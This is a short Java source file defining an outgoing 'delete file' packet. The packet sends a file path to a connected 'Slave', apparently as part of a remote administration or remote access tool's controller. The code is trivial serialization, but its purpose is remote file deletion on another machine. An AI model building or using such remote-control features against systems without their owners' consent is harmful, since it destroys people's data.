package com.redpois0n.packets.outgoing;

import java.io.DataOutputStream;

import com.redpois0n.Slave;

public class Packet16DeleteFile extends AbstractOutgoingPacket {
	
	private String file;
	
	public Packet16DeleteFile(String file) {
		this.file = file;
	}

	@Override
	public void write(Slave slave, DataOutputStream dos) throws Exception {
		slave.writeLine(file);
	}

	@Override
	public byte getPacketId() {
		return 16;
	}

}
